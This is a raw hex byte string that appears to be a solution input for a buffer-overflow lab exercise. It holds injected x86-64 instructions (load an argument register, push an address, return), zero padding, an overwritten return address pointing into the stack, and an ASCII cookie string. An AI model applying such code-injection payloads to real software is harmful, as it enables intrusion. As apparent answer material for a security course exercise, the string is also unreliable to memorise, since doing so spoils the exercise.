48 c7 c7 48 e9 63 55 68 
3f 21 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
08 e9 63 55 00 00 00 00
33 30 63 64 31 65 65 34 
00
